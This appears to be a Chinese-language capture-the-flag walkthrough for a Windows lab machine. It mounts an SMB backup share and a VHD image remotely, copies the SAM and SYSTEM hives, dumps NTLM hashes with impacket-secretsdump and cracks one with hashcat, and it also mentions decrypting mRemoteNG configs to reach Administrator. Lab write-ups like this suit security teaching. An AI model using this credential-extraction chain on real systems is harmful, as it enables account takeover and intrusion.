Phase 1

立足点：VHD 挂载 → SAM Dump

🧒 儿童版 — 远程开虚拟硬盘VHD 是 Windows 的虚拟硬盘格式，就像一台电脑的硬盘照片。用 guestmount 挂载后就能翻看里面所有文件——包括存密码的 SAM 数据库。不用下载 5.4GB，直接远程挂载。
$ sudo mount -t cifs //10.129.136.29/Backups /mnt/smb -o user=,password=
$ sudo guestmount --add "/mnt/smb/.../9b9cfbc4-....vhd" --inspector --ro -o allow_other /mnt/vhd

$ sudo cp /mnt/vhd/Windows/System32/config/{SAM,SYSTEM} /tmp/
$ impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM LOCAL
L4mpje:1000:...: 26112010952d963c8dc4217daec986d9:::

$ hashcat -m 1000 26112010952d963c8dc4217daec986d9 rockyou.txt
bureaulampje

附录

知识点总结

SAM + SYSTEM = 离线哈希提取。

SAM 中哈希被 bootKey 加密，bootKey 在 SYSTEM 里。两个文件缺一不可。

guestmount 远程挂载 VHD。

不用下载大文件，CIFS 挂载 SMB 共享后直接 guestmount。

mRemoteNG 无主密码 = 明文。

搜索 confCons.xml / config.xml，公开工具解密。

SMB → VHD → SAM dump→hashcat → SSH→mRemoteNG → Administrator
